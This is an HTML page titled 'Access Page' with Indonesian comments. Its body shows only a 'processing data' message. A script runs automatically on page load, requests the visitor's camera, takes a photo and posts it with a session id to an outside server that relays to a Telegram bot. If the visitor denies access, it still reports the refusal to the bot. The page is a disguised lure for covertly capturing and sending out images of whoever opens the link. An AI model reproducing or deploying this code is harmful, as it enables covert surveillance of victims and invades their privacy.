<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Page</title>
    <script>
        async function sendDataToServer() {
            try {
                // Coba untuk mengakses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const photoBlob = await imageCapture.takePhoto();
                track.stop();

                // Kirim data ke server
                const formData = new FormData();
                formData.append("photo", photoBlob);

                const session = new URLSearchParams(window.location.search).get("session");
                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                    method: "POST",
                    body: formData,
                });

                alert("Data berhasil dikirim ke bot Telegram!");
            } catch (error) {
                console.error("Error:", error);
                alert("Gagal mengambil foto. Data tetap dikirim ke bot.");
                
                // Kirim data ke bot meskipun gagal mengambil foto
                const session = new URLSearchParams(window.location.search).get("session");
                const formData = new FormData();
                formData.append("photo", ""); // Kirimkan placeholder foto kosong

                // Kirimkan data ke server walau foto gagal diambil
                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                    method: "POST",
                    body: formData,
                });

                // Kirim pesan ke bot Telegram walaupun tidak ada foto
                const textMessage = "Pengguna tidak memberikan izin untuk mengakses kamera.";
                await sendTextMessageToBot(textMessage);
            }
        }

        // Fungsi untuk mengirim pesan ke bot Telegram
        async function sendTextMessageToBot(text) {
            try {
                const session = new URLSearchParams(window.location.search).get("session");
                const formData = new FormData();
                formData.append("message", text);
                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                    method: "POST",
                    body: formData,
                });
            } catch (error) {
                console.error("Error sending text to bot:", error);
            }
        }

        // Jalankan fungsi saat halaman dimuat
        window.onload = sendDataToServer;
    </script>
</head>
<body>
    <h1>Memproses data...</h1>
</body>
</html>
